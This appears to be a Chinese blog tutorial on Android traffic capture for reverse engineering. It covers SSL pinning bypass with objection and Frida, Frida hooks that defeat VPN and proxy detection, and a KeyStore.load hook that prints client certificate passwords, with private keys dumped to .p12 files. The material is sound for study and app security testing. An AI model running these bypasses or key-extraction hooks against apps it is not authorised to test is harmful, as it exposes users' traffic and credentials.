        <content type="html"><![CDATA[<h1>Android抓包</h1><p>抓包工具：</p><ul><li>Packet Capture：无需root，基于本地VPN实现的抓包，可以支持TCP及以上层的消息捕获。</li></ul><p><a href="https://www.anquanke.com/post/id/197657#h3-10">实用FRIDA进阶：内存漫游、hook anywhere、抓包-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1967845">《安卓逆向这档事》第二十一课、抓包学得好，牢饭吃得饱(中) - 吾爱破解 - 52pojie.cn</a></p><h2 id="Http和Https">Http和Https</h2><p><strong>Http</strong>：是一种应用层协议，用于传输超文本，如html文档，以及其他资源，如图像和视频。他是一种无状态的协议，这就意味着每个请求都是独立的，服务器不会保存有关客户端的任何信息。HTTP工作在TCP/IP协议栈的应用层，使用TCP端口80进行通信</p><p><strong>HTTPS</strong>：是http的安全版本，他通过SSL/TLS协议对http进行加密，SSL/TLS提供加密数据，身份验证，和数据完整性的保护，确保数据在传输过程中的安全。HTTPS使用443端通信，HTTPS并非一种新协议。只是http通信接口部分用SSL和TLS协议代替。</p><p><strong>HTTP方法</strong></p><p><img src="assets/image-20241019230748809.png" alt="image-20241019230748809"></p><p><strong>HTTP常见状态码</strong></p><p><img src="assets/image-20241019230826536.png" alt="image-20241019230826536"></p><h2 id="抓包介绍">抓包介绍</h2><p>抓包一般分为两种情形：</p><p>应用层：Http(s)协议抓包</p><p>会话层：Socket端口通信抓包</p><ul><li>Hook抓包：通过对发包函数的Hook来达到抓包的目的</li><li>中间人抓包：将原来一段完整的客户端-服务端的通信方式割裂成两段客户端-服务端的通信，中间人抓包在OSI模型结构又分为 ===&gt; 应用层：Http(s)协议抓包   会话层：Socket通信抓包</li></ul><p>如果进行应用层协议抓包，可以使用Burpsuite或者Charles，不建议使用Fiddler，因为其无法导入客户端证书，在服务器校验客户端证书时无通过。如果是会话层抓包，则选择<code>tcpdump</code>和<code>WireShark</code>相组合的方式。</p><p>使用<code>jnettop</code>还可以实时查看流量走势和对方<code>IP</code>地址，更为直观和生动。</p><p>对于安卓应用来说，<code>Socket</code>通信天生又分为两种<code>Java</code>层<code>Socket</code>通信和<code>Native</code>层<code>Socket</code>通信。</p><ul><li><code>Java</code>层：使用的是<code>java.net.InetAddress</code>、<code>java.net.Socket</code>、<code>java.net.ServerSocket</code>等类，与证书绑定的情形类似，也可能存在着自定义框架的<code>Socket</code>通信，这时候就需要具体情况具体分析，比如谷歌的<code>protobuf</code>框架等；</li><li><code>Native</code>层：一般使用的是<code>C Socket API</code>，一般<code>hook</code>住<code>send()</code>和<code>recv()</code>函数可以得到其发送和接受的内容</li></ul><p><strong>Socket通信的一些关键函数</strong></p><p>Http：java.net.SocketOutputStream的socketWrite方法和java.net.SocketInputStream的read方法</p><p>Https:com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write([B,int,int)<br>和com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read([B,int, int)，</p><p>并且它们的第一个参数永远是明文的request或者response数据。</p><h2 id="环境配置">环境配置</h2><p>保证主机和手机在一个局域网内，并且给手机进行代理设置，可以长按WLAN手动代理，代理服务器地址为主机的ip和端口。这样容易被下面的代码检测</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.getProperty(<span class="string">&quot;http.proxyHost&quot;</span>)<span class="comment">;</span></span><br><span class="line">System.getProperty(<span class="string">&quot;http.proxyProt&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>所以最好采用VPN代理，采用工具Postern进行配置。注意目标地址设置为 ‘*’ 指定所有手机流量从代理经过</p><p>当对Charles进行http抓包时，需要关闭SSL模式(快捷键 ctrl+L)和Enable SOCKS proxy，且抓 https数据是乱码。</p><p>这里https配置不在赘述</p><h2 id="中间人抓包对抗">中间人抓包对抗</h2><h3 id="SSL-pinning">SSL pinning</h3><p><img src="assets/3e7d68353ecaa9c62720955d1d230ea61665.png" alt="图片"></p><p><strong>SSL Pining</strong>：又称证书绑定，可以说是客户端校验服务器的进阶版，该方式不仅校验服务器证书是否是系统中的可信凭证，在通信过程中甚至连系统内置的证书都不信任而只信任app指定的证书。一旦发现服务器证书为非指定证书即立刻停止通信，最终导致即使将Charles证书安装到系统信任凭据中也无法生效。</p><p>服务器校验客户端：这种方式发生在https验证身份阶段，服务器在接收到客户端的公钥后，再发送session key之前先对客户端的公钥进行验证，如果不是信任证书的公钥，服务器就终止和客户端的通信。</p><p>由于ssl pining是在app代码内实现的所有可以通过hook来绕过。Objection本身可以完成SSL Pining Bypass的功能</p><p><code>android sslpinning disable</code></p><p>另外DroidSSLUnpining开源项目也可以进行绕过</p><p>在服务器校验客户端对抗手段中，在中间人的状态下与服务器通信的实际上是抓包工具，所有我们可以将app中内置的证书导入Charles中 让服务器认为自己扔在是与其信任的客户端进行通信，达到欺骗服务器的作用。</p><p>或者 <a href="https://github.com/deathmemory/FridaContainer">GitHub - deathmemory/FridaContainer: FridaContainer 整合了网上流行的和自己编写的常用的 frida 脚本，为逆向工作提效之用。 frida 脚本模块化，Java &amp; Jni Trace。</a></p><p><strong>ObjectionUnpinningPlus</strong></p><p><a href="https://github.com/WooyunDota/DroidSSLUnpinning/blob/master/ObjectionUnpinningPlus/hooks.js">https://github.com/WooyunDota/DroidSSLUnpinning/blob/master/ObjectionUnpinningPlus/hooks.js</a></p><p><a href="https://github.com/WooyunDota/DroidDrops/blob/master/2018/Frida.Android.Practice.md">https://github.com/WooyunDota/DroidDrops/blob/master/2018/Frida.Android.Practice.md</a></p><ul><li>使用方法1 attach : frida -U com.example.mennomorsink.webviewtest2 —no-pause -l hooks.js</li><li>使用方法2 spawn : python <a href="http://application.py">application.py</a> com.example.mennomorsink.webviewtest2</li></ul><h2 id="Hook模拟抓包">Hook模拟抓包</h2><ul><li>打印内存中加载的类 <code>android hooking list classes</code></li><li>通过关键字HTTPURLConnect和okhttp(3)过滤类 <code>cat objection.log |grep -i </code> HTTPURLConnect或okhttp(3)  注意：这里objection.log是第一步输出类的日志</li><li>利用objection的-c参数 trace执行hook命令 ，先建一个文本.txt，里面内容是要执行的命令，类似于<code>android hooking watch class 类名</code>，txt文本建立后，使用<code>objection -g 包名 explore -c xxx.txt</code>即可</li><li>hook后点击app的登录看看有没有函数被调用，如果有进一步分析</li><li>这里选择一个hook到的函数hook他<code>android hooking watch class_method 函数名 --dump-args --dump-backtrace --dump-return</code> 重新登录一下app</li><li>发现数据包发送的函数为A，(通过hook他进一步验证猜想)</li></ul><p>一个能够完成混淆后的 okhttp的项目：okhttpLogger-Frida</p><p>okhttpLogger-Frida:通过反射区获取所有的类并利用okhttp3的一些框架特征去验证app中是否使用了okhttp3这个网络通信框架。</p><p>使用方法</p><ul><li>下载okhttpfind.dex，推到/data/local/tmp目录</li><li>启动app并使用命令将okhttp_poker.js注入app中<br><code>frida -U -l okhttp_poker.js </code></li><li>注入后，按照提示输入find()命令以执行寻找okhttp框架的功能，如果找到相应的okhttp类便会将结果打印出来</li><li>将找到的结果复制到okhttp_poker.js覆盖掉原本okhttp_poker.js脚本中关于okhttp类的一些定义</li><li>然后重新注入这个okhttp_poker.js脚本。执行hold()命令，然后任意点击app的按钮，便会发现一些网络连接的内容。提示：如果想要能够保存，在输入脚本注入命令时候加上-o 保存文件的路径，这样将一次注入后的所有输出保存到文件中。</li></ul><h3 id="客户端验证服务端的姿势">客户端验证服务端的姿势</h3><p>[<a href="https://bbs.kanxue.com/thread-283483.htm">原创]Android app三种常见抓包场景及案例分析-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p><ol><li>使用objection进行常规的抓包hook操作(见上)，或者使用 objection的 <code>android sslpinning disable</code></li><li>考虑到app在验证证书时一定会打开证书文件判断是否是app信任的框架，所以会使用File类的构造函数打开证书获得句柄。所以hook File类的构造函数<br><code>android hooking watch class_method java.io.File.$init --dump-args --dump-return</code><br>（在linux终端$需要使用转义字符，即File./$init）,hook后以/system/etc/security/cacerts这个系统存放证书的路径为关键字进行搜索<br>或者如下objection命令：<br><code>objection -N -h 127.0.0.1 -p 26666 -g cn.ticktick.task explore -P ~/.objection/plugins -s &quot;android hooking watch class_method java.io.File.\init --dump-args --dump-backtrace --dump-return</code></li></ol><h3 id="服务端验证客户端的姿势">服务端验证客户端的姿势</h3><p>抓包出现**“400 No required SSL certificate was sent”**即出现服务端校验客户端。</p><p>抓包工具中导入app的证书</p><p>将apk解包，搜索证书<code>tree NCfhl |grep -i p12 </code></p><p>系统加载证书文件的方式–使用keystore.load函数，第一个参数是证书输入流，第二个参数是密码。对着进行hook即可打印证书和其密码(代码实现具体见《抓包实战》书籍246页)。或者如下</p><p><img src="assets/image-20240704222928657.png" alt="image-20240704222928657"></p><p>或者使用如下脚本打印密码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_KeyStore_load</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">StringClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">KeyStore</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore&quot;</span>);</span><br><span class="line">        <span class="title class_">KeyStore</span>.<span class="property">load</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.security.KeyStore$LoadStoreParameter&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0</span>) &#123;</span><br><span class="line">            <span class="title function_">printStack</span>(<span class="string">&quot;KeyStore.load1&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;KeyStore.load1:&quot;</span>, arg0);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">load</span>(arg0);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="title class_">KeyStore</span>.<span class="property">load</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.io.InputStream&#x27;</span>, <span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0, arg1</span>) &#123;</span><br><span class="line">            <span class="title function_">printStack</span>(<span class="string">&quot;KeyStore.load2&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;KeyStore.load2:&quot;</span>, arg0, arg1 ? <span class="title class_">StringClass</span>.$new(arg1) : <span class="literal">null</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">load</span>(arg0, arg1);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook_KeyStore_load...&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>或者使用r0capture</strong></p><p>对于使用r0capture的原理：</p><p>在安卓开发中，系统包是无法混淆的，例如java.security.KeyStore不会被混淆，所以可以hook这个类来获得证书，并且在java中，KeyStore$PrivateKeyEntry是存储在KeyStore中的，包含私钥和相关证书，即getPrivateKey() 和 getCertificateChain() 这两个方法，也就是说当应用程序调用getPrivateKey() 和 getCertificateChain() 方法来获得私钥和证书的时候，会被脚本拦截提取返回的私钥和证书数据，然后storeP12()函数，将提取出来的私钥和证书组合起来，存储为一个.p12文件，并使用密码r0ysue进行加密写入指定文件中。</p><h2 id="r0capture">r0capture</h2><p>具体使用见github官方文档</p><p>如果r0capture跑不起来：</p><ul><li>attch加载py</li><li>frida跑script.js</li><li>-w 3 等待几秒</li></ul><p>实现主要是从hook底层函数出发</p><p><strong>TCP/Socket抓包</strong></p><p>java.net.SocketOutputStream.socketWrite0和java.net.SocketInputStream.socketRead0</p><p><img src="assets/image-20240701202339677.png" alt="image-20240701202339677"></p><p><strong>SSL/so抓包</strong></p><p>对于Native层收发包函数的hook和存储 也就是SSL库中的，SSL_read和SSL_write的收发内容</p><p><img src="assets/image-20240701202326570.png" alt="image-20240701202326570"></p><p><strong>客户端证书</strong></p><p>在服务器校验客户端的情况下 帮助dump客户端证书并保存为p12格式 密码为rysue</p><p><img src="assets/image-20240701202136809.png" alt="image-20240701202136809"></p><p><strong>证书定位</strong>、</p><p>所有SSL pining都必定打开文件计算哈希</p><p>hook所有文件打开操作 从调用栈定位混淆位置</p><p><img src="assets/image-20240701202237286.png" alt="image-20240701202237286"></p><h2 id="不走代理的检测">不走代理的检测</h2><p>在HttpURLConnection和okhttp框架中可以指定不走代理。</p><p>在HttpURLConnection中添加openConnection(Proxy.NO_PROXT)</p><p><img src="assets/image-20240703123900637.png" alt="image-20240703123900637"></p><p>在okhttp框架中添加.proxy(Proxy.NO_PROXY)</p><p><img src="assets/image-20240703124030288.png" alt="image-20240703124030288"></p><p>通过如下命令可以设置代理</p><p><img src="assets/image-20240703125011490.png" alt="image-20240703125011490"></p><p><strong>VPN检测</strong></p><p>VPN检测是指应用程序或系统检查用户是否正在使用虚拟专用网络（Virtual Private Network, VPN）的一种技术。当用户使用VPN时，他们的网络流量会被加密并通过一个远程服务器路由，这可以隐藏用户的实际IP地址和位置信息，同时保护数据的安全性和隐私。</p><p><strong>原理</strong></p><p>当客户端运行VPN虚拟隧道协议时，会在当前节点创建基于<code>eth</code>之上的<code>tun0</code>接口或<code>ppp0</code>接口。这些接口是用于建立虚拟网络连接的特殊网络接口。</p><p>VPN 协议大多是作用在 OSI 的第二层和第三层之间，由此可见VPN能抓到代理方式的所有的包</p><p>代码检测：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">Check_Vpn1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Enumeration&lt;NetworkInterface&gt; networkInterfaces = NetworkInterface.getNetworkInterfaces();</span><br><span class="line">            <span class="keyword">if</span> (networkInterfaces == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">it</span> <span class="operator">=</span> Collections.list(networkInterfaces).iterator();</span><br><span class="line">            <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">                <span class="type">NetworkInterface</span> <span class="variable">networkInterface</span> <span class="operator">=</span> (NetworkInterface) it.next();</span><br><span class="line">                <span class="keyword">if</span> (networkInterface.isUp() &amp;&amp; !networkInterface.getInterfaceAddresses().isEmpty()) &#123;</span><br><span class="line">                    Log.d(<span class="string">&quot;zj595&quot;</span>, <span class="string">&quot;isVpn NetworkInterface Name: &quot;</span> + networkInterface.getName());</span><br><span class="line">                    <span class="keyword">if</span> (Intrinsics.areEqual(networkInterface.getName(), <span class="string">&quot;tun0&quot;</span>) || Intrinsics.areEqual(networkInterface.getName(), <span class="string">&quot;ppp0&quot;</span>) || Intrinsics.areEqual(networkInterface.getName(), <span class="string">&quot;p2p0&quot;</span>) || Intrinsics.areEqual(networkInterface.getName(), <span class="string">&quot;ccmni0&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            th.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">Check_Vpn2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> z;</span><br><span class="line">        String networkCapabilities;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">systemService</span> <span class="operator">=</span> getApplicationContext().getSystemService(<span class="string">&quot;connectivity&quot;</span>);</span><br><span class="line">            Intrinsics.checkNotNull(systemService, <span class="string">&quot;null cannot be cast to non-null type android.net.ConnectivityManager&quot;</span>);</span><br><span class="line">            <span class="type">ConnectivityManager</span> <span class="variable">connectivityManager</span> <span class="operator">=</span> (ConnectivityManager) systemService;</span><br><span class="line">            <span class="type">NetworkCapabilities</span> <span class="variable">networkCapabilities2</span> <span class="operator">=</span> connectivityManager.getNetworkCapabilities(connectivityManager.getActiveNetwork());</span><br><span class="line">            Log.i(<span class="string">&quot;zj595&quot;</span>, <span class="string">&quot;networkCapabilities -&gt; &quot;</span> + networkCapabilities2);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">z2</span> <span class="operator">=</span> networkCapabilities2 != <span class="literal">null</span> &amp;&amp; networkCapabilities2.hasTransport(<span class="number">4</span>);</span><br><span class="line">            <span class="comment">// 检查网络能力是否包含 &quot;WIFI|VPN&quot; </span></span><br><span class="line">            <span class="keyword">if</span> (networkCapabilities2 != <span class="literal">null</span> &amp;&amp; (networkCapabilities = networkCapabilities2.toString()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (StringsKt.contains$<span class="keyword">default</span>((CharSequence) networkCapabilities, (CharSequence) <span class="string">&quot;WIFI|VPN&quot;</span>, <span class="literal">false</span>, <span class="number">2</span>, (Object) <span class="literal">null</span>)) &#123;</span><br><span class="line">                    z = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">return</span> !z || z2;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            z = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (z) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>anti</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">hook_vpn</span><span class="params">()</span> &#123;</span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">NetworkInterface</span> <span class="operator">=</span> Java.use(<span class="string">&quot;java.net.NetworkInterface&quot;</span>);</span><br><span class="line">        NetworkInterface.getName.implementation = function () &#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">name</span> <span class="operator">=</span> <span class="built_in">this</span>.getName();  <span class="comment">//hook java层的getName方法</span></span><br><span class="line">            console.log(<span class="string">&quot;name: &quot;</span> + name);</span><br><span class="line">            <span class="keyword">if</span> (name === <span class="string">&quot;tun0&quot;</span> || name === <span class="string">&quot;ppp0&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;rmnet_data0&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> name;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">var</span> <span class="variable">NetworkCapabilities</span> <span class="operator">=</span> Java.use(<span class="string">&quot;android.net.NetworkCapabilities&quot;</span>);</span><br><span class="line">        NetworkCapabilities.hasTransport.implementation = function () &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        NetworkCapabilities.appendStringRepresentationOfBitMaskToStringBuilder.implementation = function (sb, bitMask, nameFetcher, separator) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bitMask == <span class="number">18</span>) &#123;</span><br><span class="line">                console.log(<span class="string">&quot;bitMask&quot;</span>, bitMask);</span><br><span class="line">                sb.append(<span class="string">&quot;WIFI&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                console.log(sb, bitMask);</span><br><span class="line">                <span class="built_in">this</span>.appendStringRepresentationOfBitMaskToStringBuilder(sb, bitMask, nameFetcher, separator);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一种检测框架</p><p><img src="assets/image-20240703131243570.png" alt="image-20240703131243570"></p><p>当开启vpn时，getName获得网络设备名称=<strong>tun0</strong> 主要检测java.net.NetworkInterface.getName</p><p>第二组检测<img src="assets/image-20240709195852130.png" alt="image-20240709195852130"></p><p>如果开启vpn，输出会有vpn字眼</p><p><strong>connectionProxyDictionary</strong></p><p>设置 connectionProxyDictionary 变量，可以防止 Burp、Charles 抓包工具抓包 仅限设置系统代理的时候防止抓包，第三方代理工具仍然可以抓得到包，比如shadowrocket】</p><p><a href="https://www.jianshu.com/p/1afce4a6bd7e">connectionProxyDictionary 笔记 - 简书</a></p><p><a href="https://github.com/cherubstar/iOSEnvDetection/blob/d8fe85956c62446a663e69915bc4f1cbfce2d0a0/EnvDetection/EnvDetection/AgentDetection/AgentDetection.m#L94">iOSEnvDetection/EnvDetection/EnvDetection/AgentDet…</a></p><h2 id="HttpURLConnection">HttpURLConnection</h2><h3 id="基本框架">基本框架</h3><p>这种通信框架一般在子线程中进行。其中HttpsRequest封装了HttpURLConnection实现</p><p><img src="assets/image-20240703124824748.png" alt="image-20240703124824748"></p><p><strong>HttpURLConnection基本框架</strong></p><p><img src="assets/image-20240703125108363.png" alt="image-20240703125108363"></p><p><img src="assets/image-20240703130214141.png" alt="image-20240703130214141"></p><p><img src="assets/image-20240703130315196.png" alt="image-20240703130315196"></p><h3 id="自吐">自吐</h3><p>从基本框架知道，主要信息在HttpURLConnection对象和URL构造函数中，所以可以hook这两个函数</p><p>注意HttpURLConnection是抽象类，所在的类路径是<code>com.android.okhttp.internal.huc.HttpURLConnectionImpl</code>(可以通过frida hook和objection的打印返回值验证)</p><h3 id="证书验证">证书验证</h3><p><img src="assets/image-20240703131207369.png" alt="image-20240703131207369"></p><p>HttpURLConnection要实现app对证书的校验需要添加如下部分</p><p><img src="assets/image-20240703131532884.png" alt="image-20240703131532884"></p><p>在TrustManager中实现验证的代码逻辑。</p><p>这里的sslContext.getSocketFactory是证书检测 添加这个的前提是SSLContext.init的第二个参数要定义一个TrustMeanager对象,在这个里面写证书校验逻辑</p><p>然后对trustmanager重写方法</p><p><img src="assets/image-20240703131616267.png" alt="image-20240703131616267"></p><p>客户端校验客户端主要在checkServerTrusted实现，先从app中内置的证书中获得正确的公钥，然后和得到的证书链的证书公钥进行比较验证。</p><p><img src="assets/image-20240703131651749.png" alt="image-20240703131651749"></p><p>在setHostnameVerifier(VERIFY)也可以进行证书校验操作</p><p><img src="assets/image-20240703142809363.png" alt="image-20240703142809363"></p><h3 id="证书校验绕过">证书校验绕过</h3><p>就是hook那两个关键函数就行setSSLSocketFactory和setHostnameVerifier</p><h2 id="okhttp3">okhttp3</h2><p>首先xml中申请一个可能网络通信的权限</p><p>然后app/build.gradle中的dependencies节点中增加对第三方库的引用</p><p><code>implementation(&quot;com.squareup.okhttp3:okhttp:3.12.0&quot;)</code></p><p><strong>基本框架</strong></p><p><img src="assets/image-20240703145349726.png" alt="image-20240703145349726"></p><p>如果要是post请求 添加如下代码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FormBody formBody = new FormBody.Builder().<span class="built_in">add</span>(<span class="string">&quot;name&quot;</span>，<span class="string">&quot;value&quot;</span>).<span class="built_in">add</span>()<span class="built_in">..</span>. .buidl();</span><br><span class="line"></span><br><span class="line">Request中.post(formBody)</span><br></pre></td></tr></table></figure><h3 id="拦截器">拦截器</h3><p>okhttp通过拦截器Interceptor完成监控管理，重写和重试请求。每个网络请求无论是get还是post都会经过okhttp的拦截器，所以Interceptor是个很好的hook点，可以hook到请求和响应。</p><p>使用拦截器：</p><p>在定义的客户端对象中添加<code>.addNetworkInterceptor(new xxxx())</code>其中new xxx()是创建实现Interceptor的类对象。</p><p>当一个app没有使用Interceptor，那如何通过Interceptor进行打印请求响应呢？ 操作如下</p><ul><li>把实现Interceptor的类放入Android Studio中编译成apk，提取出来里面的dex文件</li><li>编写frida脚本</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="title function_ invoke__">openClassFile</span>(<span class="string">&quot;/data/local/tmp/xxx.dex&quot;</span>).<span class="title function_ invoke__">load</span>();</span><br><span class="line"><span class="keyword">var</span> interceptor=Java.<span class="keyword">use</span>(<span class="string">&quot;拦截器类路径&quot;</span>)；</span><br><span class="line"><span class="keyword">var</span> Builder=Java.<span class="keyword">use</span>(<span class="string">&quot;Build类路径&quot;</span>);</span><br><span class="line">Builder.build.implementation=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> this.<span class="title function_ invoke__">addNetworkInterceptor</span>(interceptor.<span class="variable">$new</span>().<span class="title function_ invoke__">build</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="证书检测">证书检测</h3><p>在客户端对象处添加如下</p><p><img src="assets/image-20240703160957498.png" alt="image-20240703160957498"></p><p>另外一个校验点：CertificatePinner，证书锁定</p><p><img src="assets/image-20240703180155577.png" alt="image-20240703180155577"></p><p>主要是调用这个CertificatePinner类下的check方法进行证书hash加密后的比较校验，然后这里的sslSocketFactory参数中的trustManager是经过一系列操作(如新建一个keystore存放证书等)后正确的证书的数据，应该和CertificatePinner中参数的sha256进行比较校验。</p><h3 id="证书绕过">证书绕过</h3><p>也就是hook掉上面有关证书验证的那三个函数。</p><p>当出现okhttp3混淆时候，就需要关注一些相关系统函数，然后看他的调用栈找到关键的校验函数，如CertificatePinner的check函数</p><p>比较常见的实现https类的各自证书校验方式：</p><p><img src="assets/905443_VRDJKTB2QDRSNQ6.png" alt="image-20211205163031752"></p><h2 id="基于xposed的两个绕过ssl-pinning的模块">基于xposed的两个绕过ssl pinning的模块</h2><p><img src="assets/905443_GQTKJ7GVBKAX8FB.png" alt="img"></p><h2 id="jni层SSL系统源码自吐">jni层SSL系统源码自吐</h2><p>hook点有两个部分，如下<img src="assets/image-20240704210621418.png" alt="image-20240704210621418"></p><p>libssl.so中的SSL_write和SSL_read。这两个是native层实现的函数，参数buf是未经过操作的请求数据</p><p>libc.so的write和read中的buf参数则是经过处理后的请求数据，可以通过这个打印调用栈找到SSL_write和SSL_read或者app自实现的实现相应功能的函数。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
